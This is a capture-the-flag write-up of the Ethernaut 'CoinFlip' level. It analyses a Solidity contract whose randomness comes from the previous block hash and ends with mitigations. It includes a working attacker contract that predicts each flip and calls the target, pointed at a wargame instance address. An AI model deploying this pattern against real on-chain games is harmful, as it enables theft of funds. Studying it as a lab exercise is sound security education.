---
title: "4. CoinFlip"
tags:
- writeups
---

- used [mythrill](https://github.com/ConsenSys/mythril) for static analysis on EVM bytecode: `myth a CoinFlip.sol`
	- make sure you store your contracts locally *(`coinFlip.sol` & dependencies: `SafeMath.sol`)* 
	- control flow decision is made based on the block hash of a previous block
- we might be able to guess every time by having control over how the `blockValue` is determined, so let's look @ the contract

## Disecting the contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlip {

    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    // it's actually 2^255
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Setup the counter to 0
    constructor() public {
      consecutiveWins = 0;
    }


    // give a bool, get bool back
    function flip(bool _guess) public returns (bool) {
      // block.number: the curr block nr
      // blockhash(): hash of the given block — only for 256 most recent blocks
      // look @ the nr of the prev block, get hash & cast to uint256
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));


      // check for multiple txs  on the same block  
      // and let through only the first one
      if (lastHash == blockValue) {
        // undo all state changes, but handled 
        // differently than an `invalid opcode`
        //   - allows youo to return value
        //   - or refund remaining gas to caller
        revert();
      }
      // set the lastHash based on blockValue
      // ! it's entirely dependent on the block tx is included on
      lastHash = blockValue;
      
      // btw: 3 / 4 = 0 in solidity
      // so we should get only 1 or 0
      uint256 coinFlip = blockValue.div(FACTOR);
      bool side = coinFlip == 1 ? true : false;

      // compare pseudo random flip result with
      // user's guess & adjust wins accordingly
      if (side == _guess) {
        consecutiveWins++;
        return true;
      } else {
        consecutiveWins = 0;
        return false;
      }
    }
}
```

## Exploitation
**Every single transaction in the same block can determine the same `blockValue` => evaluate the *coinflip* result**. 

How we could do that ? As always the best way to attack a smart contract is with another smart contract :))
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
using SafeMath for uint256;

contract CoinFlip {
	...
}

contract angryApe {
  CoinFlip public flipper; // instance of target contract
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  bool public guess; // make guess accesible

  // init connection to the target contract
  constructor() {
    flipper = CoinFlip(0x37b29A2b9d16b4d005EfcEce415e555C5FD2cf71);
  }

  // sometimes you can cheat
  function cheat() public returns(bool) {
    // calculate blockValue, flip & get your guss
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 flip       = blockValue.div(FACTOR);
    guess   = flip == 1 ? true : false;

    // send to target contract
    flipper.flip(guess);
    return true;
  }
}
```

The only thing left to be done is to spam the `cheat()` function
> *is there any way to automate this?*


## Takeaways
>  "This property of Proof of Work based consensus is one of the greatest obstacles to achieving truly random outcomes on the blockchain. Think on that before building a decentralized lotto 🤑"
- generating random numbers in solidity can be tricky, since everything in smart contracts i publicly visible *(including the local `private` vars)*
- whenever developing a smart contract keep in mind that miners also have control over things like: blockhashes, timestamps & whether to include certain txs
### Mitigation
- to get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.
- other options include using Bitcoin block headers *(verified through [BTC Relay](http://btcrelay.org/))*, [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).

## See Also
- [[Ethernaut Wargame]]